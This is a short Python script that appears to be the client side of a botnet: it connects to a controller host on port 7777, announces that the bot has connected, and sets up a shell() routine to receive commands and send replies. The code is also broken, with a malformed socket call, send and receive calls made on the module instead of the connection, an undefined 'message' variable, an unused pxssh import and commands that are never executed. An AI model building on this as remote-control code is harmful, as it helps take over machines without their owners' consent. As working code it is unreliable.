import socket
from pexpect import pxssh

def init():
    global bot
    host = ''
    port = 7777
    botnumber = 1
    bot = socket.socket((socket.AF_INET, socket.SOCK_STREAM))
    bot.connect((host, port))
    socket.send("Bot has succesfully connected".encode('utf-8'))
    print(socket.recv(1024).decode("utf-8"))
    
def shell():
    command = bot.recv(1024)
    bot.send(message.encode('utf-8'))

init()
shell()